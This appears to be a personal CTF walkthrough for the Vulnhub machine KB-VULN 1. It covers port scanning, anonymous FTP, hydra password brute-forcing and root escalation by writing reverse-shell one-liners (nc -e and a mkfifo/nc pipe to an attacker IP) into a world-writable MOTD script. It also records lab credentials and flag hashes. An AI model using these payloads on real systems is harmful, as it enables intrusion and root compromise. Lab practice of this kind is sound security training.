
---

Vulnhub URL: https://www.vulnhub.com/entry/kb-vuln-1,540/

\[OS]:  Ubuntu
\[Web-Technology]: Apache httpd 2.4.29, Colorlib, jquery 3.3.1 
\[Hostname]:  KB-VULN
\[IP]:  192.168.56.109
\[USERS]:   sysadmin
\[CREDENTIALS]:  

ftp - anonymous :: anonymous
ftp and ssh - sysadmin :: password1


---
\[To-Try LIST]:  

To try:
- hydra in ftp or ssh as sysadminm
- Web form on site

**Ports:**
21 - FTP  vsftpd 3.0.3 - **Anon login**
```bash
ftp $IP #login as anonymous :: anonymous
ftp> ls -la  # .bash_history
ftp> exit

cat .bash_history

#exit
#ls
#cd /etc/update-motd.d/
#ls
#nano 00-header
#exit 

#Note try /etc/update-motd.d/00-header

#Nothing more in FTP

# Hydra FTP

hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt ftp://$IP
ftp> get user.txt
cat user.txt
48a365b4ce1e322a55ae9017f3daf0c0


```


80 - http

22 - SSH - requires creds -  OpenSSH 7.6p1 

---
\[NMAP RESULTS]:  
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.101
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:84:46:ae:47:21:d1:73:7d:2f:0a:66:87:98:af:d3 (RSA)
|   256 af:79:86:77:00:59:3e:ee:cf:6e:bb:bc:cb:ad:96:cc (ECDSA)
|_  256 9d:4d:2a:a1:65:d4:f2:bd:5b:25:22:ec:bc:6f:66:97 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: OneSchool &mdash; Website by Colorlib
|_http-server-header: Apache/2.4.29 (Ubuntu)


--- 

\[Web Services Enumeration]:   

**Page Navigation**
**Page Source** ->   <!-- Username : sysadmin -->

**File and Directory Busting**

```bash

#dir busting
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 30

/server-status 403

# nikto 
??

#whatweb - jquery 3.3.1 -> searchsploit - xss



```

---


\[OTHER / PRIVILEGE-ESCALATION]:   

```bash
# SSH connection
ssh sysadmin@$IP

#which - perl, wget, curl, nc

groups #adm??

ls -lsaht /etc/sudoers #we are not a sudoer but there are
4.0K -r--r----- 1 root root 757 Aug 22  2020 /etc/sudoers


ls /var/www/html #oneschool.zip

#Lets check that /etc/update-motd.d/00-header mentioned in ftp
sysadmin@kb-server:/tmp$ ls -l /etc/update-motd.d/00-header 
-rwxrwxrwx 1 root root 989 Aug 22  2020 /etc/update-motd.d/00-header

# Runs as root - world writable! - add

nc -e /bin/bash 192.168.56.101 4444

#motd runs when a user logs in via ssh its the ssh banner

#Didnt work troubleshoot by running manually (as sysadmin so no privesc)
run-parts /etc/update-motd.d/
WELCOME TO THE KB-SERVER - Check NC for connection

/bin/nc: invalid option -- 'e'
#this version of netcat doesn't support -e - so retry with
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.56.101 4444 > /tmp/f


#ok now rerun with ssh

```
![[Pasted image 20251101234923.png]]
```bash
cat /root/flag.txt
1eedddf9fff436e6648b5e51cb0d2ec7

```

--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
